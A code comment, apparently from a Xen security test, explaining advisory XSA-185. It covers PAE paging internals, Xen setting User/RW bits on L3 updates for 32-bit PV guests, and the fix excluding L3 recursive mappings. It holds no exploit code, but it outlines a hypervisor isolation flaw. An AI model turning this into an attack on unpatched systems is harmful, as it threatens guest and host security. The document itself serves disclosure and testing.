 *
 * Advisory: [XSA-185](https://xenbits.xen.org/xsa/advisory-185.html)
 *
 * This vulnerability is along the same lines as XSA-182, and was uncovered
 * once XSA-182 had been fixed.  Please refer to 182 for the discussion of
 * recursive pagetables.
 *
 * For real 32bit PAE mode, @%cr3 points at a 32byte block of memory
 * containing 4 entries which look a little like regular pagetable entries.
 * When a reload of @%cr3 occurs, they are loaded into 4 internal processor
 * registers.  In this regard, they behave like 4 independent @%cr3 pointers;
 * there aren't actually 3 levels of pagetable being walked by the processor.
 *
 * In these 4 entries, all control bits other than Present and the two
 * cacheability bits are strictly reserved, and must be zero.  User and RW are
 * implied by the actual pagewalk starting at the appropriate L2 table, and
 * not at the block that @%cr3 is actually pointing at.
 *
 * When running a 32bit PV guest on a 64bit, architectural behaviour needs
 * maintaining when running on plain 4-level pagetables.  As such, the guest
 * will not set User/RW, and Xen must set them unconditionally on all L3
 * updates, to maintain architectural behaviour.
 *
 * Because of the construction of 32bit PAE paging on real hardware, there is
 * no way to construct an L3 recursive mapping (to create an equivalent
 * effect, 4 adjacent L2 entries need pointing at the 4 in-use L2 entries), so
 * the security fix is to specifically exclude that option.
 *
